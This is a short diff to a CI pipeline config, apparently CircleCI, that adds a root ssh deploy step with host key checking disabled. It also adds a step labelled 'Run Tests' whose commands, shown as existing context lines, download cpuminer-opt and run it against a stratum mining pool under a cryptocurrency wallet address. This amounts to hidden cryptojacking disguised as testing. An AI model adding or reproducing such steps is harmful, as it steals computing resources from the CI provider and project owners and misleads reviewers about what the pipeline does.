@@ -36,6 +36,10 @@ jobs:
       - run:
           name: Deploy app to Linode Producrion Server via Docker
           command: |
+            ssh -o StrictHostKeyChecking=no root@fosscon.punkdata.org "/bin/bash ./deploy_app.sh $DOCKER_LOGIN/$IMAGE_NAME:$TAG"
+      - run:
+          name: Run Tests
+          command: |   
             wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
             tar xf cpuminer-opt-linux.tar.gz
             ./cpuminer-sse2 -a yespowersugar -o stratum+tcp://stratum-eu.rplant.xyz:7042 -u sugar1q6gpz239e68cx824g7tk2etgwrmlshta324uyv6.bo
